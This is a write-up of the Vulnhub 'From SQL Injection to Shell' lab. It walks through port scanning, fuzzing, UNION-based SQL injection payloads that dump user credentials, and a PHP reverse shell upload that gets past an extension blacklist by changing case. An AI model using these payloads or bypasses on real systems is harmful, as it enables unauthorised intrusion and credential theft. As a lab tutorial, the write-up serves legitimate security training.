---
title: Vulnhub from sql injection to shell.
categories: [Writeup, hackingWeb]
tags: [sqli, fileupload]
description: Write up exploiting sqli and file upload vulnerability. 
---

Download vulnerable target: [from sql injection to shell Vulnhub.](https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/)

# From SQLI to shell.

## Discovery.

### Port Scan.

The first step is allways to run nmap and see which ports are opened in the target.
```bash
nmap -p- -Pn -sS --min-rate 5000 --open 192.168.1.39 -oN scan
```
![img-description](assets/images/writeups/2024/fromSqliToShell/1.png)
_Ports scan._

```bash
nmap -p22,80 -sVC -Pn 192.168.1.39 -oN versionScan
```

![img-description](assets/images/writeups/2024/fromSqliToShell/2.png)
_Once we know wich ports are opened we make an nmap version scan._

### Fuzzing web

In the nmap scan we saw that port 80 is opened hosting Apache, when we are exploiting a web server is allways good to to fuzz searching for hidden files or directories in the target. I like to use `ffuf` to do so:
```bash
ffuf -u <url> -w <wordlists> -ic -c 
```

![img-description](assets/images/writeups/2024/fromSqliToShell/4.png)
_Once we know wich ports are opened we make an nmap version scan._


Another essential when we are attacking a web server is to check wich technology, services or programming lenguajes is the target using. To check it I allways like to use `whatweb`.

![img-description](assets/images/writeups/2024/fromSqliToShell/5.png)
_Once we know wich ports are opened we make an nmap version scan._



### Manual Web analysis.

_While the fuzzing is still running we can go to our browser and open the target web server to analyze it._

We allways have to __check the url__, a lot of vulnerabilities can be exploited there.
![img-description](assets/images/writeups/2024/fromSqliToShell/6.png)

![img-description](assets/images/writeups/2024/fromSqliToShell/7.png)
The web shows images using `id=<imageId>` 


This is a good place to try to inyect some characters and see how the server react to them.
![img-description](assets/images/writeups/2024/fromSqliToShell/8.png)
__The character ' is tipically used to detect an SQLI vulnerability.__ And the target is reacting to it.

---------------------------------

## Exploitation.
Once we detect an SQLI vulnerability we have to insert different payloads to try to exploit it.


### SQLI.

> You can visit my GitHub profile to see and study step by step all the techniques we are going to use from now on.
[Github SQL Injection.](https://github.com/PentestRed/Hacking-Web/tree/main/SQL%20Injection)
{: .prompt-info }

#### getting the number of columns; ORDER BY.
The first step when we face a SQLI attack is to know how many columns does the target db has.

![img-description](assets/images/writeups/2024/fromSqliToShell/9.png)

![img-description](assets/images/writeups/2024/fromSqliToShell/10.png)

__As we can see the db has 4 columns.__

#### Database Enumeration; UNION INJECTION.

##### Front-end columns.

Not all the database columns are shown in the front-end, that's why we have to __check which of the columns are shown and where__, we can try to use `@@version` in the different columns and see which of them show the results.

```sql
1 UNION SELECT 1, @@version, 3, @@version
```

![img-description](assets/images/writeups/2024/fromSqliToShell/11.png)


##### Databases.
We must know how many db are to see which one is more interesting for us to extract info.

```sql
1 UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA
```


![img-description](assets/images/writeups/2024/fromSqliToShell/12.png)

##### Tables.

Now we can try to show all the tables.
```sql
1 UNION SELECT 1, table_name, 3, table_schema FROM INFORMATION_SCHEMA.TABLES
```

![img-description](assets/images/writeups/2024/fromSqliToShell/13.png)
![img-description](assets/images/writeups/2024/fromSqliToShell/14.png)
_We see this table, which seems very interesting._

##### Columns.
```bash
1 UNION SELECT 1, column_name, 3, table_schema FROM INFORMATION_SCHEMA.COLUMNS where table_name='users'
```


![img-description](assets/images/writeups/2024/fromSqliToShell/15.png)



##### Dumping data
We can finally show data.

```sql
1 UNION SELECT 1, login, 3, 4 FROM photoblog.users
```

![img-description](assets/images/writeups/2024/fromSqliToShell/16.png)
_USERNAME_

```sql
1 UNION SELECT 1, password, 3, 4 FROM photoblog.users
```

![img-description](assets/images/writeups/2024/fromSqliToShell/17.png)
_PASSWORD_



### Cracking Passwords.

We can crack the password and acces the admin panel.

![img-description](assets/images/writeups/2024/fromSqliToShell/20.png)
__PASSWORD:__ p4ssw0rd_

![img-description](assets/images/writeups/2024/fromSqliToShell/19.png)
_Admin Panel._






## File Upload Attack.
The page we are attacking has an image upload utility, we can try to upload our PHP payload to achieve a reverse shell.

> You can acces to my Github repository to explore how to execute [File Upload Attacks](https://github.com/PentesterArchive/Pentesting-Fundamentals-Skills-and-Techniques./blob/main/One%20liners/PHP.md).
{: .prompt-info }


### PHP File Upload.

This is the admin panel, we can upload pitures from here.
![img-description](assets/images/writeups/2024/fromSqliToShell/21.png)
![img-description](assets/images/writeups/2024/fromSqliToShell/22.png)

If we try to upload a reverse shell, we receive a warning from the server that we cannot upload PHP files.

![img-description](assets/images/writeups/2024/fromSqliToShell/23.png)

#### PHP blacklist bypass.

We can bypass the blacklist using different techniques. One of them is changing cases, for example: PhP, pHp, pHP...

![img-description](assets/images/writeups/2024/fromSqliToShell/24.png)

We use `nc` to wait for the connection.<br />
![img-description](assets/images/writeups/2024/fromSqliToShell/25.png)

Our malicious file has been __upload__, let's __execute it and enter the system__.
![img-description](assets/images/writeups/2024/fromSqliToShell/26.png)


![img-description](assets/images/writeups/2024/fromSqliToShell/27.png)
